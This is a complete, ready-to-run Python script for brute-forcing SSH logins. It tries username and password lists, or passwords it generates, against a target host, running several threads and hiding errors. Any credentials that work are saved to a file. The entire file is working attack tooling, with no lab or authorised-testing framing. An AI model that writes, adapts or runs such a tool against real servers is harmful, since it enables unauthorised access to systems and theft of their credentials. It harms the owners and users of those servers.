#!/usr/bin/env python3
# file: ssh_brute.py

import paramiko
import socket
import time
from colorama import init, Fore
import itertools
import string
import argparse
from threading import Thread
import queue
import sys
import contextlib
import os
import threading

init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

q = queue.Queue()
stop_event = threading.Event()
exit_on_success = False
custom_port = 22

@contextlib.contextmanager
def suppress_stderr():
    with open(os.devnull, 'w') as devnull:
        old_stderr = sys.stderr
        sys.stderr = devnull
        try:
            yield
        finally:
            sys.stderr = old_stderr

def is_ssh_open(hostname, username, password, port=22, retry_count=3, retry_delay=10):
    if stop_event.is_set():
        return False

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        with suppress_stderr():
            client.connect(hostname=hostname, port=port, username=username, password=password, timeout=3)
    except socket.timeout:
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"{RED}[-] Invalid credentials for {username}:{password}{RESET}")
        return False
    except paramiko.SSHException as e:
        if retry_count > 0:
            print(f"{BLUE}[*] SSH Exception: {str(e)}{RESET}")
            print(f"{BLUE}[*] Retrying in {retry_delay} seconds...{RESET}")
            time.sleep(retry_delay)
            return is_ssh_open(hostname, username, password, port, retry_count-1, retry_delay * 2)
        else:
            print(f"{RED}[!] Maximum retries reached. Skipping {username}:{password}{RESET}")
            return False
    except Exception as e:
        print(f"{RED}[!] Unexpected error: {str(e)}{RESET}")
        return False
    else:
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        with open("credentials.txt", "w") as f:
            f.write(f"{username}@{hostname}:{password}\n")
        stop_event.set()
        if exit_on_success:
            os._exit(0)
        return True

def load_lines(file_path):
    with open(file_path, 'r', encoding='latin-1') as file:
        lines = file.read().splitlines()
    return lines

def generate_passwords(min_length, max_length, chars):
    for length in range(min_length, max_length + 1):
        for password in itertools.product(chars, repeat=length):
            yield ''.join(password)

def worker(host):
    while not q.empty() and not stop_event.is_set():
        username, password = q.get()
        is_ssh_open(host, username, password, port=custom_port)
        q.task_done()

def main():
    global exit_on_success, custom_port

    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contains password list in each line.")
    parser.add_argument("-u", "--user", help="Single username to use.")
    parser.add_argument("-U", "--userlist", help="File that contains username list in each line.")
    parser.add_argument("--generate", action="store_true", help="Generate passwords on the fly.")
    parser.add_argument("--min-length", type=int, help="Minimum length of generated passwords", default=1)
    parser.add_argument("--max-length", type=int, help="Maximum length of generated passwords", default=4)
    parser.add_argument("--chars", type=str, help="Characters to use for password generation", default=string.ascii_lowercase + string.digits)
    parser.add_argument("--threads", type=int, help="Number of threads to use", default=4)
    parser.add_argument("--exit-on-success", action="store_true", help="Exit the program when a successful login is found.")
    parser.add_argument("--port", type=int, help="Custom SSH port to connect to", default=22)

    args = parser.parse_args()
    host = args.host
    threads = args.threads
    exit_on_success = args.exit_on_success
    custom_port = args.port

    if not args.user and not args.userlist:
        print("Please provide a single username or a userlist file.")
        sys.exit(1)

    users = load_lines(args.userlist) if args.userlist else [args.user]

    if args.passlist:
        passwords = load_lines(args.passlist)
    elif args.generate:
        passwords = generate_passwords(args.min_length, args.max_length, args.chars)
    else:
        print("Please provide a passlist file or specify to generate passwords.")
        sys.exit(1)

    if args.passlist:
        print(f"[+] Usernames to try: {len(users)}")
        print(f"[+] Passwords to try: {len(passwords)}")
    else:
        print(f"[+] Usernames to try: {len(users)}")
        print(f"[+] Generating passwords on the fly")

    for user in users:
        for password in passwords:
            q.put((user, password))

    threads_list = []
    for _ in range(threads):
        thread = Thread(target=worker, args=(host,))
        thread.daemon = True
        thread.start()
        threads_list.append(thread)

    q.join()
    stop_event.set()
    for t in threads_list:
        t.join()

if __name__ == "__main__":
    main()
